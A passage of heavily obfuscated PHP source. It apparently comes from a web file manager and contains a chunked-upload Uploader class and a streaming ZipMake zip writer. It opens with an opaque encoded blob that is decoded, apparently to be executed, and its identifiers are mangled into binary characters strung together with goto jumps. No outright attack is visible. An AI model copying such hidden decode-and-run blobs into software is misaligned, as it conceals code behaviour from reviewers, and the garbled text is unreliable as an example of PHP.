\10\152\276\43\203\163\230\207\155\112\313\331\51\156\327\17\210\12\260\124"."\xe6\xce\xbd\x93\x88\xba\xb6\x3a\x5a\x57\xbd\xfd\xc5\x54\x42\x5b\xe\x4b\x8c\x44\xb8\x68\x8f\x2c\x9\x84\x1b\x4d\x14\x67\x6e\x80\xe9\xbb\x77\xf4\x39\x3c\x99\xf9\x30\x82\xce\x9f\xd8\xe\x1e\x9f\x6f\x12\x94\x6c\x96\xaf\xb0\xe2\x4b\x42"."\xd9\xb8\xac\xbb\x0\x8d\xd\x9a\xd4\x59\x5e\xa5\x88\x28\xde\x57\xd8\x34\x52\xc9\x93\x37\x20\xaf\x26\x6\x2b\x38\xc7\x82\x1d\xf\xd5\xc8\x84\xc5\x4d\x10\x9\xca\xd0\x38\x87\x1\x92\x3\x53\xff\xa4\x21\xb4\x67\x82\x72\x24\x65\x65\xe2"."\xa3\x2e\x1\xa6\xf1\x50\x43\xb8\xe7\xc0\x7c\xca\x12\xe0\x3c\xa4\x87\xa4\x22\x37\xb0\x80\xca\x78\x48\xc4\xb2\xf2\x59\x80\x62\xf7\x10\x22\x80\xf\x26\x50\x7a\xb0\xe4\x80\xce\xb4\x5a\x85\x8d\xa\x46\x32\xc4\xbe\xb5\x9c\xed\x96\xfb\x4a"."\x2b\xcf\xcd\x66\xa5\x98\x25\x6\x2a\x66\x3d\x37\x11\x8b\xc2\x5a\x9\x70\x5f\x1f\x82\x3b\x6f\x97\xad\x38\x36\x6d\x2a\xce\x11\xd5\xc0\x67\xcb\xe2\xf6\x12\x84\xc4\x8a\xd1\xb9\x16\xd4\x35\x24\x27\x59\xa1\xec\xa0\x40\xb0\xb0\x13\xd4\xdb".base64_decode('wnZuZTvvBjsa4S4IPwGrakiJwxOWAM+Swr3d1chFPgTAAH5scDkR25ZL4yThP/zkZDVMhoUsl3w9/A==').base64_decode('Oe8aiT+ViNMJtQJBv0Nj4w5vuwXFKPKshcU/PIGJSyV9/UK4RrcmQAfg1tnSUgktoemGgMbglXDB8A==')."\207\115\313\100\101\171\227\12\331\140\33\41\361\141\105\33\143\274\327\265\154\171\211\332\230\10\22\256\274\240\1\205\325\205\61\112\104\140\372\304\54\51\101\270\251\261\336\231\151\164\241\54\343\126\105\325\57\44".base64_decode('o1z0tULwCx/58HEHJCgZny97hmSmUmXP1WvZPAg3bAlElnxThzLGQS3RP56Cas9hZlQ92armk3b8Yg==')."\x3e\xce\xa0\x1c\x1d\xc\x6\x47\xae\x70\x5b\x24\xc8\xb\x2c\xb\x90\xca\x38\x33\xb7\xc1\x85\x75\x87\xb3\x53\x79\x88\xdf\xc4\x70\xf1\x38\x99\xec\x90\x87\x2a\xa0\x32\x57\x2\xc\xa\x20\xc\x15\x9\x48\xc2\xdb\x44\xdc\x2f\xb6\x52\x12"."\277\116\360\122\345\253\16\104\54\207\362\267\213\354\355\102\23\215\301\311\205\130\136\360\51\110\110\221\203\20\116\202\271\233\24\366\30\120\133\223\373\241\304\165\144\33\161\376\111\353\23\113\14\215\15\6\300\101".strrev('‰Ák/¸Î–iÌºñQÏke§şWfco÷‰Åñ2‡Šø¡'."\0".'S‘%µıt³§‚Ó¶ÔNV')."\211\226\352\330\207\26\155\2\70\135\142\140\16\235\170\272\350\141\161\71\276\142\253\275\230\301\336\62\234\103\57\353\37\222\247\362\247\355\37\240\335\143\337\132\361\102\204\55\116\331\325\174\104\253\220\7\327\250".base64_decode('YjacBHNyOc6S1yipZiJTMS9OgnnLkmlm4UxDyGfKRWOM5pV3HtmqlzEyALJtYjHqWP1ZEbn8c4R47A==')."\330\150\157\137\271\26\25\317\124\306\252\105\105\344\61\153\301\261\155\234\272\22\77\244\51\25\70\40\277\40\57\347\265\74\255\302\165\75\56\23\56\322\41\213\216\153\131\262\170\367\137\131\73\40\124\161\26\33"."\xd6\x6b\x7b\x1b\x5c\xec\x18\xee\xc5\x94\xf8\x35\x1d\xcc\x53\x3f\x61\x20\x3b\x77\xb0\x9\x55\xe3\x3d\xba\xbd\x73\xa8\xf4\x67\x73\x59\x4d\x69\x2f\x5f\x14\xdc\x24\x57\xf4\x79\xed\x80\xfb\xe2\xf2\x8d\x67\x96\x7a\x91\x13\x3d\x82\xe3\xbd"."\x89\x66\xaa\x9\x41\x4d\x8\x2\x45\xa7\xd6\x38\x9d\x7e\x24\xcb\x8f\xd6\x88\x94\x80\xcf\x69\xda\x45\x3d\xf8\x77\xef\xf8\xd5\xee\x6d\xd7\xed\xde\x72\xe5\xee\xb3\xd7\xee\x3c\xe7\x62\xc7\xae\xf5\xd7\xec\xba\xec\xf4\x5d\x97\x6d\xdc\x79"."\xc6\x95\x3b\x2f\xb9\x1e\x27\xec\xba\xfc\x94\xf7\x2e\x39\x7b\x8e\xb4\xeb\xf4\x13\x61\xe2\x85\xeb\x76\xdc\x73\x7\xfe\x77\xe7\xd5\x77\xbf\xbb\xe5\xfe\xdd\xf7\x6d\xc1\x28\x3b\x6f\xba\xfb\xdd\x9b\xae\xd9\x7d\xfe\xf5\xbb\x4e\xbb\x73\xd7".base64_decode('RVfsuuA0+vSq5cin/HjIxU+vLW7Y8QJPTu7xBRvSFGOXNnCD5sDrJk4Oa7oJvS8Afl9Av62aaVI2BA==').strrev('aµÆ†Ø'."\0".'r2]´QĞë~T$X#/%•8Šœ†ÌÜUÉ<FZ ]GC~!'."\0".'9ĞIÜäDD‰„jÄ').strrev('4n"òNœ*×ÿ˜÷4Iì’A©”2y\'¨œ ÌMÅ8Ü4mR¢ËB›ò.Åº@yx^\'èJB').strrev('KTA|“‹j¾›ÁP+ÊƒK/çÇ·o4¬g W`¤²•e¹FK.¥V;P}Ã„ô–\\$p¾ÅŞbD	êl>')."\217\337\117\365\51\313\153\341\153\133\300\153\202\356\124\371\221\171\41\243\321\123\141\233\146\27\275\141\10\313\164\262\211\217\304\50\71\166\330\45\24\141\75\163\20\207\331\240\157\52\263\100\241\154\167\42\10\17"."\x50\xf1\xa4\x87\x14\x16\xa2\x9e\x4f\x7b\xbc\xb\x39\xe3\x60\xd2\x30\x6a\x90\xa8\xbd\xc6\x6f\x8d\x5d\x96\xdb\x65\x1\x8e\x26\xb\x62\x5f\x2\x11\x8a\x4b\x33\x2\xd4\x56\xec\x31\xf1\x16\xb8\xfc\x16\x0\xa5\xf2\x2e\x80\x35\x3d\x9e\xfa"."\72\131\241\305\205\123\176\314\323\54\334\114\324\66\302\141\222\374\377\1\115\210\347\164\36\307\0\0".""."".base64_decode('').strrev(''), 10, -8))); goto F¾ÊÛˆæç; e¶ŠÍÚÙ£Ä: if (class_exists($_SERVER[¨¤¼…´][1955])) { class Services_JSON_Error extends PEAR_Error { function __construct($bÍˆ¶ó¯˜ = "\x75\x6e\x6b\156\x6f\167\x6e\40\x65\162\162\x6f\162", $b®²àÍàø° = null, $d÷²¾ìåæ = null, $aÉøÏäóôä = null, $d®Š…Ğâ¤ = null) { parent::PEAR_Error($bÍˆ¶ó¯˜, $b®²àÍàø°, $d÷²¾ìåæ, $aÉøÏäóôä, $d®Š…Ğâ¤); } } } else { class Services_JSON_Error { function __construct($f…ÚÀÎ‚Í¤ = "\165\156\153\x6e\157\x77\x6e\x20\x65\x72\x72\157\162", $Díİè²½© = null, $C–íæøõ×ò = null, $Aœäí¹æÍ = null, $cŸœŒÃ’…¢ = null) { } } } class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto C¶ª“öÜ¦ì; Aå­œÉÄ¼¦: $this->checkSize(); $this->tempPathInit(); goto cÊé¼¼¥‘; C¶ª“öÜ¦ì: $F’¾ëÃ±Ò =& $_SERVER[¨¤¼…´]; global $in; $this->in =& $in; goto E·ëÂÎ–‡; E·ëÂÎ–‡: if (!empty($_FILES)) { $CšÁéøÇ‹ğ = $_FILES[$F’¾ëÃ±Ò[181]]; $this->uploadFile = $CšÁéøÇ‹ğ[$F’¾ëÃ±Ò[1956]]; if (!$this->uploadFile && $CšÁéøÇ‹ğ[$F’¾ëÃ±Ò[1208]] > 0) { show_json($this->errorInfo($CšÁéøÇ‹ğ[$F’¾ëÃ±Ò[1208]]), !1); } } else { if (isset($in[$F’¾ëÃ±Ò[398]])) { $this->uploadFile = isset($in[$F’¾ëÃ±Ò[1957]]) ? $F’¾ëÃ±Ò[1958] : $F’¾ëÃ±Ò[1801]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto Aå­œÉÄ¼¦; cÊé¼¼¥‘: } public function upload() { goto C„İĞÖæŠ¦; A™Ÿ°˜´©ì: $Fìøà’Æ¾[$C²‹å¸ˆ¯[1969]][$C²‹å¸ˆ¯[1970] . $c”§ª¡©çã] = array($C²‹å¸ˆ¯[1971] => $BÍÕšì‡ªØ, $C²‹å¸ˆ¯[1027] => $c”§ª¡©çã, $C²‹å¸ˆ¯[87] => $D™•š¶ÑÑ‰, $C²‹å¸ˆ¯[178] => $D¿ÆÙ¨È„); $this->statusSet($Fìøà’Æ¾); if (count($Fìøà’Æ¾[$C²‹å¸ˆ¯[1969]]) != $Fìøà’Æ¾[$C²‹å¸ˆ¯[1968]]) { $this->showJson($C²‹å¸ˆ¯[1972] . $c”§ª¡©çã, !0); } goto c¨ª„Ø½±; EòÎ–Å¹: $E¾Ñ›×¥ = $this->moveUploadedFile($D¸Éªî¾èŒ); if ($D™•š¶ÑÑ‰ > 0 && filesize($E¾Ñ›×¥) == 0) { $this->showJson($C²‹å¸ˆ¯[1964], !1); } if (!$E¾Ñ›×¥) { $this->showJson(LNG($C²‹å¸ˆ¯[1965]), !1); } goto D„µ£‚»»; C„İĞÖæŠ¦: $C²‹å¸ˆ¯ =& $_SERVER[¨¤¼…´]; $c”§ª¡©çã = isset($this->in[$C²‹å¸ˆ¯[1959]]) ? intval($this->in[$C²‹å¸ˆ¯[1959]]) : 0; $dÅÛ‹øµ–  = isset($this->in[$C²‹å¸ˆ¯[1960]]) ? intval($this->in[$C²‹å¸ˆ¯[1960]]) : 1; goto fóæè«Ù‡; D„µ£‚»»: $BÍÕšì‡ªØ = $c”§ª¡©çã * $fòøˆ‡¿Ÿ„; $FÀì‰‡é = @fopen($this->tempFile, $C²‹å¸ˆ¯[1966]); fseek_64($FÀì‰‡é, $BÍÕšì‡ªØ); goto a«ªôÚâë†; aÍ¹”Åì²: CacheLock::unlock($this->tempFile); return $this->tempFile; goto a‚ÖÎ·…Ş; Bäµ£½‘…Ğ: CacheLock::lock($this->tempFile, 20); $Fìøà’Æ¾ = $this->statusGet(); $this->initFileTemp(); goto EòÎ–Å¹; c¨ª„Ø½±: ignore_timeout(); if (!$this->checkChunkHash($Fìøà’Æ¾)) { $this->showJson($C²‹å¸ˆ¯[1973], !1); } $this->statusSet(!1); goto aÍ¹”Åì²; E¯Ù¶‚¢±ğ: if ($dÅÛ‹øµ–  > 1 && $fòøˆ‡¿Ÿ„ <= 0) { show_json($C²‹å¸ˆ¯[1963], !1); } if ($fòøˆ‡¿Ÿ„ > $D™•š¶ÑÑ‰) { $dÅÛ‹øµ–  = 1; } if ($dÅÛ‹øµ–  <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto Bäµ£½‘…Ğ; fóæè«Ù‡: $D¸Éªî¾èŒ = $this->tempFile . $C²‹å¸ˆ¯[1961] . $c”§ª¡©çã; $D™•š¶ÑÑ‰ = isset($this->in[$C²‹å¸ˆ¯[533]]) ? intval($this->in[$C²‹å¸ˆ¯[533]]) : 0; $fòøˆ‡¿Ÿ„ = isset($this->in[$C²‹å¸ˆ¯[1962]]) ? intval($this->in[$C²‹å¸ˆ¯[1962]]) : 0; goto E¯Ù¶‚¢±ğ; a«ªôÚâë†: $C†£¡¦„ = $this->writeTo($E¾Ñ›×¥, $FÀì‰‡é, $this->tempFile); $D¿ÆÙ¨È„ = IO::hashSimple($E¾Ñ›×¥); $D™•š¶ÑÑ‰ = IO::size($E¾Ñ›×¥); goto C§«©Ã; C§«©Ã: @unlink($E¾Ñ›×¥); if (!$C†£¡¦„) { $this->showJson($C²‹å¸ˆ¯[1967] . $c”§ª¡©çã, !1); } $Fìøà’Æ¾[$C²‹å¸ˆ¯[1968]] = $dÅÛ‹øµ– ; goto A™Ÿ°˜´©ì; a‚ÖÎ·…Ş: } private function checkSize() { $A¶º‘µ¨ =& $_SERVER[¨¤¼…´]; if (phpBuild64() || $this->in[$A¶º‘µ¨[87]] < PHP_INT_MAX) { return; } show_json(LNG($A¶º‘µ¨[1974]), !1); } private function showJson($f«ˆøà ‚‡, $c²µ·àÜÉ) { CacheLock::unlock($this->tempFile); if (!$c²µ·àÜÉ) { return show_json($f«ˆøà ‚‡, $c²µ·àÜÉ); } show_json($f«ˆøà ‚‡, $c²µ·àÜÉ); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto E¹‹Ü«¶¼; E¹‹Ü«¶¼: $DÕ‹Á¢ÁŒõ =& $_SERVER[¨¤¼…´]; $AÙ¼«î‚• = TEMP_FILES; @mk_dir($AÙ¼«î‚•); goto D ˜Ïô‚; fâ‰’·Ÿ´: $this->tempFile = $AÙ¼«î‚• . $DÕ‹Á¢ÁŒõ[1977] . md5($d†‰Şò»Á— . $this->in[$DÕ‹Á¢ÁŒõ[1520]]); goto A½Å÷¶ªˆ‚; D ˜Ïô‚: touch($AÙ¼«î‚• . $DÕ‹Á¢ÁŒõ[1975]); $d†‰Şò»Á— = isset($this->in[$DÕ‹Á¢ÁŒõ[1976]]) ? $this->in[$DÕ‹Á¢ÁŒõ[1976]] : !1; if (strlen($d†‰Şò»Á—) < 30) { $d†‰Şò»Á— = md5(USER_ID . $this->in[$DÕ‹Á¢ÁŒõ[85]] . $this->fileName . $this->in[$DÕ‹Á¢ÁŒõ[87]]); } goto fâ‰’·Ÿ´; A½Å÷¶ªˆ‚: } private function moveUploadedFile($B¨ôªáàÄ) { $FÈÄàÃí°ğ =& $_SERVER[¨¤¼…´]; $BîİÄœ„ƒ = $this->uploadFile; if ($BîİÄœ„ƒ == $FÈÄàÃí°ğ[1978]) { @file_put_contents($B¨ôªáàÄ, base64_decode($_REQUEST[$FÈÄàÃí°ğ[1979]])); } else { if ($BîİÄœ„ƒ == $FÈÄàÃí°ğ[1801]) { $eàù¶Á¦—å = @fopen($B¨ôªáàÄ, $FÈÄàÃí°ğ[1510]); $this->writeTo($BîİÄœ„ƒ, $eàù¶Á¦—å, $B¨ôªáàÄ); } else { if (!move_uploaded_file($BîİÄœ„ƒ, $B¨ôªáàÄ)) { return !1; } } } return $B¨ôªáàÄ; } private function writeTo($aŒ„æØçÄ’, $cÈ£ƒ“è, $EáÆ·á÷êÆ) { goto cƒÂ–ãÂÄ; F±çœ…µ¢×: fclose($FÄçíøİŒà); fclose($cÈ£ƒ“è); CacheLock::unlock($b……¦Ú×²); goto cïœÕ§ÙÂ; cƒÂ–ãÂÄ: $cğá™¿Ö›Ñ =& $_SERVER[¨¤¼…´]; $b……¦Ú×² = $cğá™¿Ö›Ñ[1980] . $EáÆ·á÷êÆ; $dÛÕ©èÂˆ = CacheLock::lock($b……¦Ú×², 1); goto Bµ®ªµğ•í; Bµ®ªµğ•í: $FÄçíøİŒà = @fopen($aŒ„æØçÄ’, $cğá™¿Ö›Ñ[1509]); if (!$FÄçíøİŒà || !$cÈ£ƒ“è || !$dÛÕ©èÂˆ) { CacheLock::unlock($b……¦Ú×²); return !1; } while (!feof($FÄçíøİŒà)) { fwrite($cÈ£ƒ“è, fread($FÄçíøİŒà, 1024 * 200)); } goto F±çœ…µ¢×; cïœÕ§ÙÂ: return !0; goto F‘‹Ëù°İ¥; F‘‹Ëù°İ¥: } private function statusGet() { goto fÒŸ¾Ê×¶Ô; fÒŸ¾Ê×¶Ô: $c¿­ªô½±Î =& $_SERVER[¨¤¼…´]; if (is_array($this->statusData)) { return $this->statusData; } $DÑ°‹¥ˆ¡¡ = $this->tempFile . $c¿­ªô½±Î[1981]; goto cÚ…ù½‘Û; C–™ÊÎÁç£: if (!$this->statusData) { $b”¼÷÷é× = array($c¿­ªô½±Î[38] => $this->fileName, $c¿­ªô½±Î[1968] => 0, $c¿­ªô½±Î[1969] => array()); $this->statusSet($b”¼÷÷é×); } return $this->statusData; goto e¿åˆƒ§; cÚ…ù½‘Û: $CÜä’«‘ÌÎ = !1; if (file_exists($DÑ°‹¥ˆ¡¡)) { $CÜä’«‘ÌÎ = @file_get_contents($DÑ°‹¥ˆ¡¡); } if ($CÜä’«‘ÌÎ) { $this->statusData = json_decode($CÜä’«‘ÌÎ, !0); } goto C–™ÊÎÁç£; e¿åˆƒ§: } public function statusSet($Aõùø©Ãíé) { $C™˜¡ˆƒÂ× = $this->tempFile . $_SERVER[¨¤¼…´][1981]; if (!$Aõùø©Ãíé) { if (file_exists($C™˜¡ˆƒÂ×)) { @unlink($C™˜¡ˆƒÂ×); } return !0; } $this->statusData = $Aõùø©Ãíé; return file_put_contents($C™˜¡ˆƒÂ×, json_encode($Aõùø©Ãíé)); } private function initFileTemp() { $e¬§á”ôÌ½ =& $_SERVER[¨¤¼…´]; if (file_exists($this->tempFile)) { return; } $c¼çÛš­‹ = fopen($this->tempFile, $e¬§á”ôÌ½[1982]); fseek_64($c¼çÛš­‹, $this->in[$e¬§á”ôÌ½[87]] - 1, SEEK_SET); fwrite($c¼çÛš­‹, $e¬§á”ôÌ½[481]); fclose($c¼çÛš­‹); } public function checkChunk() { goto dˆ£ö†Ø; c¤°ÂÍó£Û: return $CÒœõÜ›; goto döö‰Í°ó©; câÃÚ÷õà÷: $cµôÕ„ªì = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($cµôÕ„ªì[$BŸŒƒ¿öŞ[1969]] as $cçƒ‹Ó) { $fŞÇ¡Çà—É = $cçƒ‹Ó[$BŸŒƒ¿öŞ[178]]; if ($fŞÇ¡Çà—É) { $CÒœõÜ›[$BŸŒƒ¿öŞ[1983] . $cçƒ‹Ó[$BŸŒƒ¿öŞ[1027]]] = $fŞÇ¡Çà—É; } } goto c¤°ÂÍó£Û; dˆ£ö†Ø: $BŸŒƒ¿öŞ =& $_SERVER[¨¤¼…´]; $CÒœõÜ› = array(); CacheLock::lock($this->tempFile); goto câÃÚ÷õà÷; döö‰Í°ó©: } private function checkChunkHash($AÀ´Šâ“Å¯) { goto E®ë‡ê°‘³; dø¬õÁÚ´¾: $BÀêÆËÖÙš = !0; foreach ($AÀ´Šâ“Å¯[$bÚØÙ™µÔĞ[1969]] as $dÉ†ÒØÓŸ) { fseek_64($aÈÛÆÖ¿•, $dÉ†ÒØÓŸ[$bÚØÙ™µÔĞ[1971]]); $bê©§äÓ¸ = PathDriverStream::hash($aÈÛÆÖ¿•, $dÉ†ÒØÓŸ[$bÚØÙ™µÔĞ[87]]); if ($dÉ†ÒØÓŸ[$bÚØÙ™µÔĞ[178]] != $bê©§äÓ¸) { $BÀêÆËÖÙš = !1; break; } } fclose($aÈÛÆÖ¿•); goto fØ£ Èˆíà; fØ£ Èˆíà: return $BÀêÆËÖÙš; goto F‡„ŞÆÅÃƒ; E®ë‡ê°‘³: $bÚØÙ™µÔĞ =& $_SERVER[¨¤¼…´]; if (count($AÀ´Šâ“Å¯[$bÚØÙ™µÔĞ[1969]]) != $AÀ´Šâ“Å¯[$bÚØÙ™µÔĞ[1968]]) { return !1; } $BñŸ¸ğÀ‹ˆ = _get($this->in, $bÚØÙ™µÔĞ[1976]); goto Bµ®·ãªÅØ; Bµ®·ãªÅØ: $F©¯àÂŒ¿÷ = _get($this->in, $bÚØÙ™µÔĞ[1984]); if (strlen($F©¯àÂŒ¿÷) == 32 && IO::hashSimple($this->tempFile) == $BñŸ¸ğÀ‹ˆ && IO::hashMd5($this->tempFile) == $F©¯àÂŒ¿÷) { return !0; } $aÈÛÆÖ¿• = fopen($this->tempFile, $bÚØÙ™µÔĞ[1159]); goto dø¬õÁÚ´¾; F‡„ŞÆÅÃƒ: } public static function fileName() { goto eÍªÔŠ‚İ; c˜Â„ŸÁ¡Ì: $a«†Æ¡Ğ³ = $a«†Æ¡Ğ³ ? $a«†Æ¡Ğ³ : time(); $D®÷¹Ç±óĞ = strtolower($fİçÙŠù¼); if ($D®÷¹Ç±óĞ == $C•ˆ­¨§Ç[1986] || $D®÷¹Ç±óĞ == $C•ˆ­¨§Ç[1987]) { $fİçÙŠù¼ = date($C•ˆ­¨§Ç[680], $a«†Æ¡Ğ³) . $C•ˆ­¨§Ç[80] . $in[$C•ˆ­¨§Ç[87]] . $C•ˆ­¨§Ç[1615]; } else { if ($D®÷¹Ç±óĞ == $C•ˆ­¨§Ç[1988]) { $fİçÙŠù¼ = date($C•ˆ­¨§Ç[680], $a«†Æ¡Ğ³) . $C•ˆ­¨§Ç[80] . $in[$C•ˆ­¨§Ç[87]] . $C•ˆ­¨§Ç[1989]; } } goto Fˆ®Ï¼¯³í; Cî¶§˜Ï‹: if (!empty($_FILES)) { $fİçÙŠù¼ = $fİçÙŠù¼ ? $fİçÙŠù¼ : $_FILES[$C•ˆ­¨§Ç[181]][$C•ˆ­¨§Ç[398]]; } if (!is_wap()) { return KodIO::clear($fİçÙŠù¼); } $a«†Æ¡Ğ³ = strtotime($in[$C•ˆ­¨§Ç[1985]]); goto c˜Â„ŸÁ¡Ì; eÍªÔŠ‚İ: $C•ˆ­¨§Ç =& $_SERVER[¨¤¼…´]; global $in; $fİçÙŠù¼ = isset($in[$C•ˆ­¨§Ç[38]]) ? $in[$C•ˆ­¨§Ç[38]] : $C•ˆ­¨§Ç[43]; goto Cî¶§˜Ï‹; Fˆ®Ï¼¯³í: return KodIO::clear($fİçÙŠù¼); goto fëŒ¯Šìñø; fëŒ¯Šìñø: } private function errorInfo($fôà’†ÕæÅ) { $cÑ¾œëØˆĞ =& $_SERVER[¨¤¼…´]; $C’ô«Ğ‘‚¨ = array($cÑ¾œëØˆĞ[1990], $cÑ¾œëØˆĞ[1991], $cÑ¾œëØˆĞ[1992], $cÑ¾œëØˆĞ[1993], $cÑ¾œëØˆĞ[1994], $cÑ¾œëØˆĞ[1995], $cÑ¾œëØˆĞ[1996], $cÑ¾œëØˆĞ[1997]); return $fôà’†ÕæÅ . $cÑ¾œëØˆĞ[4] . $C’ô«Ğ‘‚¨[$fôà’†ÕæÅ]; } } class ZipMake { const VERSION = "\x30\56\x32\x2e\60"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($aÅ£¸–Ø¦ô = null) { $a«‚ãŸİ¢£ =& $_SERVER[¨¤¼…´]; $this->outputStream = fopen($a«‚ãŸİ¢£[1998], $a«‚ãŸİ¢£[1215]); $this->outputName = $aÅ£¸–Ø¦ô; $this->needHeaders = !0; } public function addFile($eº…™ÁÌÂ, $f«í·¤ÖŸ) { goto D…ÓˆØçä‚; eÍ¢è‹¢Ó¼: while (!feof($a„†ã¿æ„‹)) { $C¸ä…ÈÍí« = fread($a„†ã¿æ„‹, 1048576); $this->send($C¸ä…ÈÍí«); } fclose($a„†ã¿æ„‹); $E¤—‘ñà²¶ = hexdec(hash_file($DƒÑĞ°òŸ[2000], $f«í·¤ÖŸ)); goto f£ƒ¶ÈÑöƒ; f£ƒ¶ÈÑöƒ: $this->addFileFooter($eº…™ÁÌÂ, $aÈîê“ö, $E¤—‘ñà²¶, $AïÙÁ°“¢, $c»ĞÆÇñÜ¤, $c¨Üõ¶Ö‰à); goto f“ÈÇ»¾š; D…ÓˆØçä‚: $DƒÑĞ°òŸ =& $_SERVER[¨¤¼…´]; $eº…™ÁÌÂ = $this->filterFilename($eº…™ÁÌÂ); $aÈîê“ö = static::METHOD_STORE; goto eÎğ¡›»¯; eÎğ¡›»¯: $c¨Üõ¶Ö‰à = $this->addFileHeader($eº…™ÁÌÂ, $aÈîê“ö); $AïÙÁ°“¢ = $c»ĞÆÇñÜ¤ = filesize_64($f«í·¤ÖŸ); $a„†ã¿æ„‹ = fopen($f«í·¤ÖŸ, $DƒÑĞ°òŸ[1999]); goto eÍ¢è‹¢Ó¼; f“ÈÇ»¾š: } public function addFileFromStream($eÊœîÔœ±Õ, $f•ª¸…¥‚) { goto c³À“›ŠÌ»; dª™ÛÇĞéò: fseek($f•ª¸…¥‚, 0, SEEK_END); $E®áç›Éè = $bÒ ÉªÛí˜ = ftell($f•ª¸…¥‚); rewind($f•ª¸…¥‚); goto D·ºˆäğŸ™; D·ºˆäğŸ™: $CÍá¥ä„ªï = hash_init($_SERVER[¨¤¼…´][2000]); while (!feof($f•ª¸…¥‚)) { $AŒº‰‰²§Å = fread($f•ª¸…¥‚, 1048576); hash_update($CÍá¥ä„ªï, $AŒº‰‰²§Å); $this->send($AŒº‰‰²§Å); } $C³ºØÚä = hexdec(hash_final($CÍá¥ä„ªï)); goto B¦›ù°ïÏ™; B¦›ù°ïÏ™: $this->addFileFooter($eÊœîÔœ±Õ, $bºŒ‹„â°Ê, $C³ºØÚä, $E®áç›Éè, $bÒ ÉªÛí˜, $bè¼—ÎïÅ•); goto bŠ©»å¬Öƒ; c³À“›ŠÌ»: $eÊœîÔœ±Õ = $this->filterFilename($eÊœîÔœ±Õ); $bºŒ‹„â°Ê = static::METHOD_STORE; $bè¼—ÎïÅ• = $this->addFileHeader($eÊœîÔœ±Õ, $bºŒ‹„â°Ê); goto dª™ÛÇĞéò; bŠ©»å¬Öƒ: } public function finish() { foreach ($this->files as $cÚºô£çİõ) { $this->addCdrFile($cÚºô£çİõ); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($bÜÊÃÎÑ…Ÿ, $A´¸ã½‡Üã) { goto b±†ñÜÑñĞ; fî‹¼ÌÑ¹í: return strlen($FÕÀ•Æ®Î) + $D™Œ¶†¢öÔ + strlen($dÑÏÖ¶í¨ê); goto bŠï“Ù¬‘à; eÃõÛ¥Ê‚: $FÕÀ•Æ®Î = $this->packFields($Aèë„×–Ë„); $dÑÏÖ¶í¨ê = $this->packFields($Añ¯´†¦Ó“); $this->send($FÕÀ•Æ®Î . $bÜÊÃÎÑ…Ÿ . $dÑÏÖ¶í¨ê); goto fî‹¼ÌÑ¹í; b±†ñÜÑñĞ: $eÔ©ãÑ‡ø½ =& $_SERVER[¨¤¼…´]; $bÜÊÃÎÑ…Ÿ = preg_replace($eÔ©ãÑ‡ø½[2001], $eÔ©ãÑ‡ø½[43], $bÜÊÃÎÑ…Ÿ); $D™Œ¶†¢öÔ = strlen($bÜÊÃÎÑ…Ÿ); goto CŒ‹‚£‹ç“; CŒ‹‚£‹ç“: $bÊ•‰¸š¤ = $this->dosTime(time()); $Aèë„×–Ë„ = array(array($eÔ©ãÑ‡ø½[2002], static::FILE_HEADER_SIGNATURE), array($eÔ©ãÑ‡ø½[2003], static::ZIP_VERSION_64), array($eÔ©ãÑ‡ø½[2003], 8), array($eÔ©ãÑ‡ø½[2003], $A´¸ã½‡Üã), array($eÔ©ãÑ‡ø½[2002], $bÊ•‰¸š¤), array($eÔ©ãÑ‡ø½[2002], 0), array($eÔ©ãÑ‡ø½[2002], 4294967295), array($eÔ©ãÑ‡ø½[2002], 4294967295), array($eÔ©ãÑ‡ø½[2003], $D™Œ¶†¢öÔ), array($eÔ©ãÑ‡ø½[2003], 32)); $Añ¯´†¦Ó“ = array(array($eÔ©ãÑ‡ø½[2003], 1), array($eÔ©ãÑ‡ø½[2003], 28), array($eÔ©ãÑ‡ø½[2004], 0), array($eÔ©ãÑ‡ø½[2004], 0), array($eÔ©ãÑ‡ø½[2004], 0), array($eÔ©ãÑ‡ø½[2002], 0)); goto eÃõÛ¥Ê‚; bŠï“Ù¬‘à: } protected function addFileFooter($b „´ÁÜ©, $eë„¶—Ù†¨, $d²ĞË¢“è, $aŒæ…»¤Š…, $eÚˆé…­Ì‚, $b¢¡¸³’¨”) { $EŞåÔÄÅËÑ =& $_SERVER[¨¤¼…´]; $EÛ†¼”ˆà = array(array($EŞåÔÄÅËÑ[2002], static::DATA_DESCRIPTOR_SIGNATURE), array($EŞåÔÄÅËÑ[2002], $d²ĞË¢“è), array($EŞåÔÄÅËÑ[2004], $aŒæ…»¤Š…), array($EŞåÔÄÅËÑ[2004], $eÚˆé…­Ì‚)); $EêìˆŒà÷ = $this->packFields($EÛ†¼”ˆà); $this->send($EêìˆŒà÷); $DóÇé™º¨— = $b¢¡¸³’¨” + $aŒæ…»¤Š… + $b¨ÉÅÚ¾Ë„; $this->addToCdr($b „´ÁÜ©, $eë„¶—Ù†¨, $d²ĞË¢“è, $aŒæ…»¤Š…, $eÚˆé…­Ì‚, $DóÇé™º¨—); } private function addToCdr($FÛŞÖ•Š±š, $c–ø ·ëöà, $dŞäÏàæŒ×, $D…“İ”Çø, $fÈĞšæ»Ü‘, $A‰š ¼—¹†) { $this->files[] = array($FÛŞÖ•Š±š, $c–ø ·ëöà, $dŞäÏàæŒ×, $D…“İ”Çø, $fÈĞšæ»Ü‘, $this->ofs); $this->ofs += $A‰š ¼—¹†; } protected function addCdrFile($CÈÌØ÷À¶„) { goto cø°¬®·íñ; bÍ–¯æ“¾: $this->send($B£‘‰£ãœ); $this->cdr_ofs += strlen($B£‘‰£ãœ); goto cëğ‘£”ˆ; fë÷ÑÜßæÑ: $A§…è½‚İ” = $this->packFields($e”†©¨Ìğ×); 